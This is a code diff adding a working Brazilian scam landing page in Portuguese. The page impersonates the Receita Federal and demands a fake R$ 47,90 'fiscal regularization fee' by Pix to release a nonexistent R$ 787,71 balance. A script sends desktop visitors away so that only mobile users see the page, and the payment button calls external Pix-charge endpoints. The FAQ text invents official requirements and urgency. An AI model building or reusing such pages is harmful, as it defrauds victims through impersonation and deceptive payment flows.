@@ -1,0 +1,546 @@
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Liberação de Saldo - Etapa Final</title>
+
+    <script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+            window.location.href = 'https://image.1111down.com/xG1nkqKTMzGDvpLrqFT7WA/ef311940-320d-4b47-94ef-600f2eafd920/width=450/1272375.jpeg';
+        }
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+        integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+        <link rel="stylesheet" href="style.css">
+    <style>
+        /* --- Paleta Simplificada --- */
+        :root {
+            --primary-color: #0d6efd;
+            /* Azul Padrão */
+            --success-color: #198754;
+            /* Verde */
+            --text-dark: #212529;
+            --text-medium: #495057;
+            --text-light: #6c757d;
+            --bg-light: #f8f9fa;
+            --bg-white: #ffffff;
+            --border-color: #dee2e6;
+            --warning-bg: #fff3cd;
+            /* Amarelo claro para alerta */
+            --warning-border: #ffeeba;
+            --warning-text: #664d03;
+            --font-family-base: 'Inter', sans-serif;
+            --border-radius-base: 8px;
+            --box-shadow-light: 0 4px 15px rgba(0, 0, 0, 0.06);
+        }
+
+        /* --- Reset e Estilos Globais --- */
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-family-base);
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-light);
+            color: var(--text-medium);
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .main-wrapper {
+            width: 100%;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 0 50px 0;
+        }
+
+        /* --- Container Principal Simplificado --- */
+        .container {
+            max-width: 650px;
+            /* Mais estreito */
+            width: 90%;
+            background-color: var(--bg-white);
+            padding: 35px;
+            /* Padding uniforme */
+            box-shadow: var(--box-shadow-light);
+            border-radius: var(--border-radius-base);
+            border: 1px solid var(--border-color);
+            margin-bottom: 30px;
+        }
+
+        /* --- Títulos Claros --- */
+        .main-headline {
+            color: var(--text-dark);
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-top: 0;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .main-headline i {
+            color: var(--primary-color);
+        }
+
+        .subtitle {
+            color: var(--text-light);
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        h3 {
+            /* Título de seção */
+            color: var(--text-dark);
+            font-weight: 600;
+            font-size: 18px;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+            padding-top: 25px;
+        }
+
+        /* --- Explicação Direta --- */
+        .explanation-text {
+            font-size: 16px;
+            color: var(--text-medium);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .explanation-text strong {
+            color: var(--text-dark);
+        }
+
+        .highlight-box {
+            /* Caixa para destacar a necessidade */
+            background-color: var(--warning-bg);
+            border: 1px solid var(--warning-border);
+            color: var(--warning-text);
+            padding: 15px 20px;
+            border-radius: var(--border-radius-base);
+            font-size: 15px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .highlight-box i {
+            margin-right: 8px;
+        }
+
+        /* --- Apresentação da Taxa --- */
+        .fee-presentation {
+            text-align: center;
+            padding: 25px;
+            background-color: var(--bg-light);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius-base);
+            margin-bottom: 30px;
+        }
+
+        .fee-label {
+            font-size: 14px;
+            color: var(--text-light);
+            display: block;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .fee-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .fee-purpose {
+            font-size: 15px;
+            color: var(--text-medium);
+        }
+
+        /* --- Botão CTA Simplificado --- */
+        .cta-button {
+            background-color: var(--success-color);
+            color: var(--bg-white);
+            border: none;
+            border-radius: var(--border-radius-base);
+            padding: 16px 25px;
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .cta-button:hover:not(:disabled) {
+            background-color: #146c43;
+        }
+
+        .cta-button:disabled {
+            background: var(--text-light);
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .cta-button:disabled i {
+            display: none;
+        }
+
+        /* --- Garantia Simples --- */
+        .security-info {
+            font-size: 13px;
+            color: var(--text-light);
+            text-align: center;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .security-info i {
+            color: var(--success-color);
+        }
+
+        /* --- FAQ Simplificado --- */
+        .faq-section {
+            margin-top: 30px;
+            border-top: 1px solid var(--border-color);
+            padding-top: 25px;
+        }
+
+        .faq-item {
+            margin-bottom: 15px;
+        }
+
+        .faq-question {
+            font-weight: 600;
+            font-size: 16px;
+            color: var(--text-dark);
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+
+        .faq-arrow {
+            font-size: 12px;
+            color: var(--primary-color);
+            transition: transform 0.3s ease;
+            margin-left: 10px;
+        }
+
+        .faq-answer {
+            font-size: 15px;
+            color: var(--text-medium);
+            display: none;
+            padding-left: 10px;
+            /* Indentação leve */
+            border-left: 2px solid var(--border-color);
+            margin-left: 5px;
+            padding-top: 5px;
+        }
+
+        .faq-item.open .faq-arrow {
+            transform: rotate(90deg);
+        }
+
+        .faq-item.open .faq-answer {
+            display: block;
+        }
+
+        /* --- Footer Simplificado --- */
+        .page-footer {
+            text-align: center;
+            padding: 25px;
+            font-size: 13px;
+            color: var(--text-light);
+            margin-top: auto;
+            width: 100%;
+            background-color: var(--bg-white);
+            border-top: 1px solid var(--border-color);
+        }
+
+        /* --- Responsividade --- */
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px 20px;
+                width: 95%;
+            }
+
+            .main-headline {
+                font-size: 22px;
+            }
+
+            .subtitle {
+                font-size: 15px;
+            }
+
+            h3 {
+                font-size: 17px;
+            }
+
+            .explanation-text,
+            .fee-purpose,
+            .faq-answer {
+                font-size: 15px;
+            }
+
+            .fee-amount {
+                font-size: 28px;
+            }
+
+            .cta-button {
+                font-size: 17px;
+                padding: 15px 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .main-headline {
+                font-size: 20px;
+            }
+
+            .subtitle {
+                font-size: 14px;
+            }
+
+            .cta-button {
+                font-size: 16px;
+            }
+        }
+    </style>
+    <style>
+        .body-no-scroll {
+            overflow: hidden;
+        }
+
+        #pre-pix-loading-overlay,
+        #pix-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+            background: rgba(255, 255, 255, 0.98);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        #pre-pix-loading-overlay.show,
+        #pix-overlay.show {
+            display: flex;
+        }
+
+        .loading-progress-container,
+        .pix-popup {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            font-family: 'Inter', sans-serif;
+        }
+
+        .progress-bar-container {
+            height: 8px;
+            width: 100%;
+            background: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #22c55e;
+            transition: width 0.4s ease;
+            border-radius: 4px;
+        }
+
+        .loading-steps {
+            list-style: none;
+            padding: 0;
+            margin: 1rem 0 0;
+        }
+
+        .loading-steps li {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .loading-steps .step-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        .loading-steps li.active .step-icon {
+            animation: spin 1s linear infinite;
+        }
+
+        .loading-steps li.completed .step-icon i {
+            color: green;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="main-wrapper">
+
+        <div class="container">
+            <h1 class="main-headline">
+                <i class="fa-solid fa-flag-checkered"></i> Etapa Final para Liberação do Saldo
+            </h1>
+            <p class="subtitle">
+                Seu saque de <strong>R$ 787,71</strong> está quase pronto! Falta apenas a regularização fiscal
+                obrigatória.
+            </p>
+
+            <p class="explanation-text">
+                Para que seu dinheiro seja liberado corretamente, precisamos seguir as normas da Receita Federal. É como
+                um "selo final" de conformidade para sua transação.
+            </p>
+            <div class="highlight-box">
+                <i class="fa-solid fa-circle-info"></i> Esta é uma <strong>exigência oficial</strong> para garantir que
+                tudo esteja <strong>100% correto</strong> com sua liberação.
+            </div>
+
+            <div class="fee-presentation">
+                <span class="fee-label">Taxa de Regularização Fiscal (TRF)</span>
+                <span class="fee-amount">R$ 47,90</span>
+                <p class="fee-purpose">Custo único para processar a documentação exigida pela Receita Federal.</p>
+            </div>
+
+            <button class="cta-button" id="cta-btn">
+                <i class="fa-solid fa-check"></i>
+                Pagar Taxa e Liberar Meu Saldo Agora
+            </button>
+
+
+            <div class="security-info">
+                <i class="fa-solid fa-lock"></i> Pagamento em ambiente seguro e criptografado.
+            </div>
+
+            <section class="faq-section">
+                <h3>Dúvidas Rápidas</h3>
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Por que preciso pagar isso agora?</span>
+                        <span class="faq-arrow"><i class="fa-solid fa-chevron-right"></i></span>
+                    </div>
+                    <div class="faq-answer">
+                        É a última etapa exigida pela Receita Federal, após a confirmação bancária, para garantir que
+                        sua transação esteja regular.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>O que acontece se eu não pagar?</span>
+                        <span class="faq-arrow"><i class="fa-solid fa-chevron-right"></i></span>
+                    </div>
+                    <div class="faq-answer">
+                        Infelizmente, sem esta regularização fiscal, seu saldo não pode ser liberado e ficará retido por
+                        pendência oficial.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <span>Quando recebo após pagar?</span>
+                        <span class="faq-arrow"><i class="fa-solid fa-chevron-right"></i></span>
+                    </div>
+                    <div class="faq-answer">
+                        A liberação do seu saldo total (R$ 787,71) é feita imediatamente após a confirmação do pagamento
+                        desta taxa.
+                    </div>
+                </div>
+            </section>
+
+        </div>
+    </div>
+    <footer class="page-footer">
+        Processo em conformidade com as normativas financeiras e fiscais.
+    </footer>
+
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
+    <script src="owBZJKTePQm4.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const ctaBtn = document.getElementById('cta-btn')
+            if (!ctaBtn) return
+
+            ctaBtn.addEventListener('click', () => {
+                initializePaymentFlow(
+                    {
+                        id: 'taxa-regularizacao',
+                        name: 'Taxa de Regularização Fiscal',
+                        priceInCents: 4790,
+                        apiname: 'Preguica',
+                        nextPage: 'https://google.com'
+                    },
+                    {
+                        generatePix: 'https://site-clientes.info/zero-api/pix.php',
+                        checkStatus: 'https://site-clientes.info/zero-api/status.php'
+                    },
+                    {
+                        name: 'Receita Federal',
+                        logoUrl: 'https://placehold.co/100x32/000000/FFFFFF?text=RFB',
+                        countdownSeconds: 10,
+                        paidBtnDelay: 10
+                    }
+                )
+            })
+        })
+    </script>
+
+
+</body>
+
+</html>
